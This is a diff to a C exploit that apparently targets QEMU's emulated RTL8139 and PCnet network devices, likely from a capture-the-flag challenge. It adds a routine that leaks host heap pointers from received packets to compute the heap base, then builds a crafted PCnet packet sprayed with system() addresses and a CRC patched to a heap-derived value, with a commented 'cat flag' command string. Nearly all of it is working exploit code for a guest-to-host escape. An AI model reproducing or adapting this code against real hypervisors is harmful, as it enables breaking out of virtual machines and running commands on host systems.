@@ -798,6 +798,52 @@ hptr_t qemu_get_phymem_address(struct rtl8139_ring *ring, size_t nb_packet)
 	}
 	return 0;
 }
+
+/* dump packet content in xxd style */
+void xxd(void *ptr, size_t size)
+{
+	size_t i;
+	for (i = 0; i < size; i++) {
+		if (i % 16 == 0) printf("\n0x%016x: ", ptr+i);
+		printf("%02x", *(uint8_t *)(ptr+i));
+		if (i % 16 != 0 && i % 2 == 1) printf(" ");
+	}
+	printf("\n");
+}
+
+
+hptr_t qemu_get_heap_address(struct rtl8139_ring *ring, size_t nb_packet, hptr_t text)
+{
+	uint16_t hi;
+	uint16_t *stop, *ptr;
+	hptr_t *target_ptr;
+	hptr_t  target = 0, max_target = 0, min_target = 0xffffffffffff, heap = 0;
+	size_t i;
+
+	hi = (text & 0xffff00000000) >> 32;
+	for (i = 0; i < nb_packet; i++) {
+		/* TODO skip IP headers */
+		ptr = (uint16_t *)(ring[i].buffer + 4);
+		stop = ptr + RTL8139_BUFFER_SIZE/sizeof(uint8_t);
+		while (ptr < stop) {
+			if (*ptr == hi) {
+				target_ptr = (hptr_t*)(ptr - 2);
+				target = *target_ptr & 0xffffffffffff; 
+				//printf("=== target : 0x%lx\n", target);
+				if(target > max_target)
+					max_target = target;
+				if(target < min_target)
+					min_target = target;
+			}
+			*ptr++;
+		}
+	}
+	printf("=== max : 0x%lx, min : 0x%lx\n", max_target, min_target);
+	printf("=== max - min : 0x%lx\n", max_target - min_target);
+	heap = (max_target & 0xfffffff00000) - 0x1600000;
+	printf("=== heap base : 0x%lx\n", heap);
+	return heap;
+}
 #if 0
 void build_got(hptr_t text, struct GOT *got)
 {
@@ -963,7 +1009,7 @@ int main()
 	void *pcnet_rx_buffer, *pcnet_tx_buffer;
 
 	void *addr;
-	hptr_t text, plt, mprotect_addr, system_addr, qemu_set_irq_addr, payload_host_addr;
+	hptr_t text, plt, mprotect_addr, system_addr, heap, qemu_set_irq_addr, payload_host_addr;
 	uint32_t targetValue;
 	uint32_t fcs = ~0;
 	uint8_t *ptr;
@@ -1047,6 +1093,11 @@ int main()
 
 	phy_mem = ((phy_mem >> 24) << 24) - PHY_RAM;
 	warnx("[+] VM physical memory mapped at 0x%"PRIxHPTR, phy_mem);
+
+	heap = qemu_get_heap_address(rtl8139_rx_ring, rtl8139_rx_nb, text);
+	if (!heap) {
+		errx(-1, "[!] giving up. failed to get VM heap address");
+	}
 #if 0 
 	payload_host_addr = gva_to_hva(&payload);
 	warnx("[+] payload at 0x%"PRIxHPTR, payload_host_addr);
@@ -1103,18 +1154,14 @@ int main()
 	hi = pcnet_config_mem >> 16;
 
 
-	uint64_t heapBaseAddr = 0;
 	uint64_t *packet_ptr;
 	packet_ptr = pcnet_packet;
 	for(int j=0x10; j<0x1f8; j += 2){
                 *(packet_ptr + j) = system_addr;
-                //*(packet_ptr + j + 1) = system_addr;
-                *(ptr + j + 1) = 0x67616c6620746163;//0x736c; //"ls"
-                //*(packet_ptr + j) = text + 0xa9e30;
-                //*(packet_ptr + j + 1) = text + 0xa9e30;
-                //*(ptr + j + 1) = heapBaseAddr + 0x220900;
-                //*(ptr + j + 2) = 0x67616c6620746163;//0x736c; //"ls"
-                //*(ptr + j + 3) = 0;
+                *(packet_ptr + j + 1) = system_addr;
+                //*(packet_ptr + j) = heap + 0x220000;
+                //*(packet_ptr + j + 2) = 0x67616c6620746163;//0x736c; //"ls"
+                //*(packet_ptr + j + 3) = 0;
         }
 
 	/* compute required crc */
@@ -1122,7 +1169,7 @@ int main()
 	while (ptr != &pcnet_packet[PCNET_BUFFER_SIZE - 4])
 		CRC(fcs, *ptr++);
 
-	targetValue = (heapBaseAddr +  0x220900) & 0xffffffff;
+	targetValue = (heap +  0x21a000) & 0xffffffff;
         printf("targetValue = 0x%x\n", targetValue);
         pcnet_packet_patch_crc(ptr, fcs, htonl(targetValue));
 
